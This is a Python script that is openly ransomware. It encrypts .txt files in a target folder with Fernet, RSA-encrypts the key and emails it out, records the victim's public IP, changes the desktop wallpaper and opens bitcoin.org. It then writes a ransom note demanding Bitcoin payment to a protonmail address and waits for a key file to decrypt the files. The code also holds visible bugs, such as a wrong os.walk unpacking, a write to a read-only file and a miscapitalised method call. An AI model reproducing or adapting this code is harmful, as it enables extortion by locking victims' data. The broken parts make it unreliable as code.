
import SendMail

try:

    from cryptography.fernet import Fernet 
    import os 
    import webbrowser 
    import ctypes
    import urllib.request
    import requests
    import time
    import datetime
    import subprocess

    from Crypto.PublicKey import RSA
    from Crypto.Random import get_random_bytes
    from Crypto.Cipher import PKCS1_OAEP
    import threading


except ModuleNotFoundError:

    from subprocess import call 
    modules = ["cryptography","Crypto","os","webbrowser","ctypes","urllib","requests","time","datetime","threading"]
    call("pip install " + ' '.join(modules), shell=True)



class RansomWare:

    file_exts = [
        'txt',
        # Ransomware can only encrypts txt files. Add this list if you want encrypt another file extension. 
    ]

    def __init__(self):
        self.key = None
        
        self.crypter = None 

        self.public_key = None

        self.sysRoot = os.path.expanduser('~')

        self.localRoot = r'E:\\web\python\Ransomware\Encrypt_files'

        self.publicIP = requests.get('https://api.ipify.org').text


    def generate_key(self):
        self.key = Fernet.generate_key()

        self.crypter = Fernet(self.key)


    def write_key(self):
        with open('fernet_key.txt','wb') as file:
            file.write(self.key)

    

    def encrypt_fernet_key(self):
        with open ('fernet_key.txt','rb') as file:
            fernet_key = file.read()

        with open ('fernet_key.txt','rb') as f:
            self.public_key = RSA.import_key(open('public.pem').read())

            public_crypter = PKCS1_OAEP.new(self.public_key)

            enc_fernet_key = public_crypter.encrypt(fernet_key)

            f.write(enc_fernet_key)

        SendMail.sendEmail(enc_fernet_key)

        self.key = enc_fernet_key

        self.crypter=None 


    def crypt_file(self, file_path,encrypted=False):
        with open (file_path,'rb') as file: 
            data = file.read()
            if not encrypted:
                print(data)

                data2 = self.crypter.encrypt(data)

                print('[>] File encrypted')
                print(data2)

            else:
                data2 = self.crypter.decrypt(data)

                print('[>] File decrypted')
                print(data2)
            
        with open (file_path,'wb') as file:
            file.write(data2)

    def crypt_system(self,encrypted=False):
        system = os.walk(self.localRoot, topdown=True)
        for root, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path)
                else:
                    self.crypt_file(file_path, encrypted=True)
    @staticmethod 
    def bitcoin():
        url = 'https://bitcoin.org/'
        webbrowser.open(url)


    def change_desktop_background(self):
        imageUrl = 'https://wallpapercave.com/wp/wp1810626.png'

        path = "{}Desktop\\Democracy.png".format(self.sysRoot)
        urllib.request.urlretrieve(imageUrl, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)


    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open('RANSOM_NOTE.txt', 'w') as file:
            file.write('''
            Your Computer Has Been Hacked.
            There is no way to restore your data without a special key.
            Only we can decrypt your files!

            
            1. You will recieve your personal BTC address for payment.
            Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
            We will check to see if payment has been paid.
            2. You will receive a text file with your KEY that will unlock all your files. 
            IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.


            ''')

    def show_ransom_note(self):
                ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
                count = 0
                while True:
                    time.sleep(0.1)
                    try:
                        import webbrowser
                        webbrowser.open("sifre.txt")

                    except:
                        count +=1
                        continue
                    if count == 5:
                        break

    def put_me_on_desktop(self):
        while True:
            try:
                with open ('{}/Desktop/PUT_ME_ON_DESKTOP.txt'.format(self.sysRoot), 'r' ) as file:
                    self.key = file.read()
                    self.crypter = Fernet(self.key)

                    self.Crypt_system(encrypted = True)
                    print('decrypted')
                    break

            except Exception as e:
                print(e)
                pass
            time.sleep(10)
            print('Checking for PUT_ME_ON_DESKTOP.txt')

if __name__ == '__main__':

    ransomware = RansomWare()
    ransomware.generate_key()
    ransomware.crypt_system()
    ransomware.write_key()
    ransomware.encrypt_fernet_key()
    ransomware.change_desktop_background()
    ransomware.bitcoin()
    ransomware.ransom_note()

    t1 = threading.Thread(target = ransomware.show_ransom_note)
    t2 = threading.Thread(target = ransomware.put_me_on_desktop)

    t1.start()
    
    t2.start()

                        
